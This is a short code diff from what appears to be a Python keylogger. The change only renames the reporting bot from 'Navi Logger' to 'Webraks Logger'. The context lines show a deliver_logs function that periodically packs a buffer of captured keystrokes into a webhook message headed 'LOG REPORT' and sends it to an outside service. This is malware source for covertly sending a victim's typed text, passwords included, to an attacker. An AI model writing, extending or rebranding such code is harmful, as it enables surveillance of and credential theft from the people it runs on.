@@ -76,7 +76,7 @@ def deliver_logs():
         time.sleep(REPORT_DELAY)
         if keys_buffer.strip():
             payload = {
-                "username": "Navi Logger",
+                "username": "Webraks Logger",
                 "avatar_url": "https://i.ibb.co/Wv94YGVx/webraks.png",
                 "content": f"**[ LOG REPORT - {time.ctime()} ]**\n```\n{keys_buffer[:1900]}\n```"
             }
